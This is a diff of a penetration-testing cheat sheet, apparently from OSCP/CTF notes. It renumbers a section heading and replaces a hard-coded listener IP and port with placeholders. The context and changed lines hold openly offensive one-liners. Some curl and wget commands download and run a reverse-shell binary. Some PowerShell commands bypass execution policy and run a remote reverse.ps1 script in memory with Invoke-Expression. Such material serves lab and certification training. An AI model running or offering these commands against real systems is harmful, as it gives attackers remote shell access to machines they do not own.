@@ -596,7 +596,7 @@ Examples: [digitalworld.local-bravery](https://github.com/joetanx/oscp/blob/main
 |cURL|`curl -O http://$KALI/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
 |Wget|`wget http://$KALI/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
 
-### 4.5 Using the [reverse.ps1](/reverse.ps1) script in this repo
+### 4.5. Using the [reverse.ps1](/reverse.ps1) script in this repo
 
 #### Download to kali
 
@@ -629,14 +629,14 @@ $env:port=<listener port>
 #### Run the script with `Invoke-Expression`
 
 ```cmd
-set address=192.168.84.3
-set port=4444
+set address=<listener address>
+set port=<listener port>
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Invoke-WebRequest https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1 -UseBasicParsing)
 ```
 
 ```pwsh
-$env:address='192.168.84.3'
-$env:port=4444
+$env:address='<listener address>'
+$env:port=<listener port>
 Invoke-Expression (Invoke-WebRequest https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1 -UseBasicParsing)
 ```
 
